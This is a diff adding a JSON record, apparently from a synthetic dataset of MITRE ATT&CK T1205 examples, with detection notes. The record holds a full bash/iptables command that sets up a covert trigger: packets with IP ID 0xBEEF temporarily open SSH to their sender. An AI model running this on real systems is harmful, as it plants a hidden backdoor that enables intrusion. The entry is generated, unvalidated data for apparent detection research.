@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -lc 'ufw --force enable && ufw default deny incoming && ufw logging high && iptables -I ufw-before-input 1 -m u32 --u32 \"4&0xFFFF=0xBEEF\" -m recent --name IPIDK --set && iptables -I ufw-before-input 1 -p tcp --dport 22 -m recent --rcheck --seconds 30 --name IPIDK -j ACCEPT'",
+  "explanation": "Uses an IP header Identification field value of 0xBEEF as a covert signal. Any packet with this IPID marks the source and temporarily opens SSH. This exploits non-standard header values as signaling. Detection: Analyze IP headers for fixed, unusual IPID values and correlate with sudden SSH acceptance from the same IP.",
+  "rationale_steps": [
+    "Enable ufw, set deny incoming, and logging.",
+    "Match packets whose IP header ID equals 0xBEEF and record the sender via recent:IPIDK.",
+    "Allow TCP/22 if the sender is recorded within 30 seconds.",
+    "Detect with packet capture looking for anomalous IPID constants and subsequent firewall allows."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-eb871457-0858f9ac",
+  "source_prompt_hash": "eb871457",
+  "timestamp_utc": "2025-09-30T03:48:01.284804Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
